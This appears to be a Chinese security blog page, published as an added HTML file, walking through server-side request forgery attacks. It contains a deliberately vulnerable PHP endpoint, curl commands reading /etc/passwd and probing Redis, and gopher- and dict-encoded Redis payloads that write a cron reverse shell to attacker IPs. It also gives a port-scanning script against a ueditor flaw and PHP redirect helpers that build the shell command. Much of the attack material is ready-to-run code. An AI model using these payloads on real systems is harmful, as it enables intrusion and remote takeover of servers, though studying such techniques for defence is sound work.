@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.4.2',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="0x01 ssrf攻击概述很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击（Server-side  Request Forgery）。">
+<meta name="keywords" content="mine">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssrf探索">
+<meta property="og:url" content="http://yoursite.com/2019/11/08/ssrf探索/index.html">
+<meta property="og:site_name" content="drag0n">
+<meta property="og:description" content="0x01 ssrf攻击概述很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击（Server-side  Request Forgery）。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2019/11/08/ssrf探索/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/08/ssrf探索/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/08/ssrf探索/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/08/ssrf探索/11.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/08/ssrf探索/12.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/08/ssrf探索/10.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/08/ssrf探索/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/08/ssrf探索/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/08/ssrf探索/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/08/ssrf探索/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/08/ssrf探索/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/08/ssrf探索/9.png">
+<meta property="og:updated_time" content="2019-11-08T06:49:56.210Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ssrf探索">
+<meta name="twitter:description" content="0x01 ssrf攻击概述很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击（Server-side  Request Forgery）。">
+<meta name="twitter:image" content="http://yoursite.com/2019/11/08/ssrf探索/1.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/11/08/ssrf探索/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>ssrf探索 | drag0n</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">drag0n</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/08/ssrf探索/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="drag0n">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ssrf探索
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2019-11-08 14:45:10 / 修改时间：14:49:56" itemprop="dateCreated datePublished" datetime="2019-11-08T14:45:10+08:00">2019-11-08</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="0x01-ssrf攻击概述"><a href="#0x01-ssrf攻击概述" class="headerlink" title="0x01 ssrf攻击概述"></a>0x01 <strong>ssrf攻击概述</strong></h1><p>很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击（Server-side  Request Forgery）。</p><a id="more"></a>
+<p>比如下图显示的就是提供这种功能的典型应用：</p>
+<p><img src="/2019/11/08/ssrf探索/1.png" alt="1"></p>
+<p>上图是一处普通的url跳转界面，但如果应用程序对用户提供的URL和远端服务器返回的信息没有进行合适的验证和过滤，就可能存在这种服务端请求伪造的缺陷。Google,Facebook,Adobe,baidu,tencent等知名公司都被发现过这种漏洞。攻击者利用ssrf可以实现的攻击主要有5种：</p>
+<p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
+<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
+<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
+<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli，redis等）;</p>
+<p>5.利用file协议读取本地文件等。</p>
+<h1 id="0x02-本地测试"><a href="#0x02-本地测试" class="headerlink" title="0x02 本地测试"></a>0x02 本地测试</h1><h2 id="漏洞代码ssrf-php（未做任何SSRF防御）"><a href="#漏洞代码ssrf-php（未做任何SSRF防御）" class="headerlink" title="漏洞代码ssrf.php（未做任何SSRF防御）"></a>漏洞代码ssrf.php（未做任何SSRF防御）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="本地利用姿势"><a href="#本地利用姿势" class="headerlink" title="本地利用姿势"></a>本地利用姿势</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># dict protocol (操作Redis)</span><br><span class="line">curl -vvv &apos;dict://127.0.0.1:6379/info&apos;</span><br><span class="line"></span><br><span class="line"># file protocol (任意文件读取)</span><br><span class="line">curl -vvv &apos;file:///etc/passwd&apos;</span><br><span class="line"></span><br><span class="line"># gopher protocol (一键反弹Bash)</span><br><span class="line"># * 注意: 链接使用单引号，避免$变量问题</span><br><span class="line">curl -vvv &apos;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&apos;</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用效果："><a href="#利用效果：" class="headerlink" title="利用效果："></a>利用效果：</h2><p><strong>读文件（file:///）</strong></p>
+<p>使用file协议读取系统内部文件</p>
+<p><img src="/2019/11/08/ssrf探索/2.png" alt="2"></p>
+<p><strong>操作redis（dict:///）</strong></p>
+<p>使用dict协议对内网所有redis进行操作</p>
+<p><img src="/2019/11/08/ssrf探索/3.png" alt="3"></p>
+<p><strong>Gopher协议</strong></p>
+<p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。  </p>
+<p>首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 是这样的：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h $1 flushall</span><br><span class="line">echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1</span><br><span class="line">redis-cli -h $1 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 config set dbfilename root</span><br><span class="line">redis-cli -h $1 save</span><br></pre></td></tr></table></figure>
+
+<p>利用这个脚本攻击自身并抓包得到数据流：</p>
+<p><img src="/2019/11/08/ssrf探索/11.png" alt="11"></p>
+<p>改成适配于 Gopher 协议的 URL：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure>
+
+<p>攻击：</p>
+<p><img src="/2019/11/08/ssrf探索/12.png" alt="12"></p>
+<h1 id="0x03-实战运用"><a href="#0x03-实战运用" class="headerlink" title="0x03 实战运用"></a>0x03 实战运用</h1><p>先上一张脑图。</p>
+<p><img src="/2019/11/08/ssrf探索/10.png" alt="10"></p>
+<p>本次测试的是ueditor编辑器某处SSRF漏洞，访问漏洞位置</p>
+<p><img src="/2019/11/08/ssrf探索/4.png" alt="4"></p>
+<p>source参数后面加上自己服务器的图片地址，调用外部图片上传至服务器</p>
+<p><img src="/2019/11/08/ssrf探索/5.png" alt="5"></p>
+<p>查看apache日志可以看到成功触发了ssrf</p>
+<p><img src="/2019/11/08/ssrf探索/6.png" alt="6"></p>
+<h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>可以通过响应速度进行端口探测，探测脚本如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">ports = [str.strip() for str in open(&apos;port.txt&apos;,&apos;r&apos;).readlines()]</span><br><span class="line"></span><br><span class="line">headers = &#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;,&quot;cookie&quot;:&quot;security_level=0; PHPSESSID=eg9opru8pg58a1h0upjneajk76&quot;&#125;</span><br><span class="line"></span><br><span class="line">for i in ports:</span><br><span class="line">    url = f&quot;http://www.bwapp.com/ueditor/php/controller.php?action=catchimage&amp;source[]=https://127.0.0.1:&#123;i&#125;&quot;</span><br><span class="line">    s=time.time()</span><br><span class="line">    response = requests.get(url,headers=headers)</span><br><span class="line">    s1=time.time()</span><br><span class="line">    s2 = s1 - s</span><br><span class="line">    if s2 &lt; 1:</span><br><span class="line">        print(f&quot;端口：&#123;i&#125;存活  响应时间：&#123;s2&#125;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>如果有内网ip的话，也可以对内网其他地址进行端口探测</p>
+<p><img src="/2019/11/08/ssrf探索/7.png" alt="7"></p>
+<h2 id="dict协议-redis未授权访问利用"><a href="#dict协议-redis未授权访问利用" class="headerlink" title="dict协议+redis未授权访问利用"></a>dict协议+redis未授权访问利用</h2><p><strong>判断是否支持302跳转</strong></p>
+<p><strong>302.php：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ip = $_GET[&apos;ip&apos;];  //传入ip</span><br><span class="line">$port = $_GET[&apos;port&apos;]; //传入端口号</span><br><span class="line">$scheme = $_GET[&apos;s&apos;];  //传入协议名称</span><br><span class="line">$data = $_GET[&apos;data&apos;];  //传入参数</span><br><span class="line">header(&quot;Location: $scheme://$ip:$port/$data&quot;); ?&gt;  //将传入的参数拼接，然后进行跳转</span><br></pre></td></tr></table></figure>
+
+<p>访问漏洞位置，调用302.php并传入参数，这里参数之间的&amp;需要进行url编码</p>
+<p><a href="http://www.bwapp.com/ueditor/php/controller.php?action=catchimage&amp;source[]=http://119.xx.xx.16/302.php?s=http%26ip=119.xx.xx.16%26port=80%26data=test.jpg" target="_blank" rel="noopener">http://www.bwapp.com/ueditor/php/controller.php?action=catchimage&amp;source[]=http://119.xx.xx.16/302.php?s=http%26ip=119.xx.xx.16%26port=80%26data=test.jpg</a></p>
+<p><img src="/2019/11/08/ssrf探索/8.png" alt="8"></p>
+<p>通过apache日志，可以确定支持302跳转</p>
+<p><img src="/2019/11/08/ssrf探索/9.png" alt="9"></p>
+<p>支持302跳转的话，可以使用dict协议向Redis数据库写shell（利用redis未授权访问漏洞）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.先清除没用的数据，防止定时任务执行失败</span><br><span class="line">/php/controller.php?action=catchimage&amp;source[]=http://xxxx/302.php?s=dict%26ip=10.20.*.*%26port=6379%26data=flushall</span><br><span class="line"></span><br><span class="line">2.利用302跳转写入反弹命令</span><br><span class="line">/php/controller.php?action=catchimage&amp;source[]=http://xxxx/fantan.php?s=dict%26ip=10.20.*.*%26port=6379%26myhost=*.*.*.*%26myport=1234</span><br><span class="line"></span><br><span class="line">3.设置导出路径</span><br><span class="line">/php/controller.php?action=catchimage&amp;source[]=http://xxxx/302.php?s=dict%26ip=10.20.*.*%26port=6379%26data=config:set:dir:/var/spool/cron/</span><br><span class="line"></span><br><span class="line">4.设置导出名字</span><br><span class="line">/php/controller.php?action=catchimage&amp;source[]=http://xxxx/302.php?s=dict%26ip=10.20.*.*%26port=6379%26data=config:set:dbfilename:root</span><br><span class="line"></span><br><span class="line">5.导出</span><br><span class="line">/php/controller.php?action=catchimage&amp;source[]=http://xxxx/302.php?s=dict%26ip=10.20.*.*%26port=6379%26data=save</span><br></pre></td></tr></table></figure>
+
+<p><strong>fantan.php</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ip = $_GET[&apos;ip&apos;];    //目标ip</span><br><span class="line">$port = $_GET[&apos;port&apos;]; //目标端口</span><br><span class="line">$scheme = $_GET[&apos;s&apos;];  //协议名</span><br><span class="line">$myhost = $_GET[&apos;myhost&apos;]; //自己的ip</span><br><span class="line">$myport = $_GET[&apos;myport&apos;]; //自己监听的端口</span><br><span class="line">header(&quot;Location: $scheme://$ip:$port/set:0:\&quot;\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-i\\x20&gt;\\x26\\x20/dev/tcp/&#123;$myhost&#125;/&#123;$myport&#125;\\x200&gt;\\x261\\x0a\\x0a\\x0a\&quot;&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h1><p><a href="http://www.4o4notfound.org/index.php/archives/33/" target="_blank" rel="noopener">http://www.4o4notfound.org/index.php/archives/33/</a></p>
+<p><a href="https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</a></p>
+<p><a href="https://www.t00ls.net/viewthread.php?tid=51972&extra=&highlight=ssrf&page=1" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=51972&amp;extra=&amp;highlight=ssrf&amp;page=1</a></p>
+<p><a href="https://www.freebuf.com/column/157466.html" target="_blank" rel="noopener">https://www.freebuf.com/column/157466.html</a></p>
+<p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">https://blog.chaitin.cn/gopher-attack-surfaces/</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/mine/" rel="tag"># mine</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2019/11/01/XXE漏洞学习/" rel="next" title="XXE漏洞学习">
+                  <i class="fa fa-chevron-left"></i> XXE漏洞学习
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-ssrf攻击概述"><span class="nav-number">1.</span> <span class="nav-text">0x01 ssrf攻击概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-本地测试"><span class="nav-number">2.</span> <span class="nav-text">0x02 本地测试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞代码ssrf-php（未做任何SSRF防御）"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞代码ssrf.php（未做任何SSRF防御）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本地利用姿势"><span class="nav-number">2.2.</span> <span class="nav-text">本地利用姿势</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用效果："><span class="nav-number">2.3.</span> <span class="nav-text">利用效果：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-实战运用"><span class="nav-number">3.</span> <span class="nav-text">0x03 实战运用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#端口探测"><span class="nav-number">3.1.</span> <span class="nav-text">端口探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dict协议-redis未授权访问利用"><span class="nav-number">3.2.</span> <span class="nav-text">dict协议+redis未授权访问利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-参考"><span class="nav-number">4.</span> <span class="nav-text">0x04 参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="site-author-image" itemprop="image" alt=""
+    src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://muse.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.4.2
+  </div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
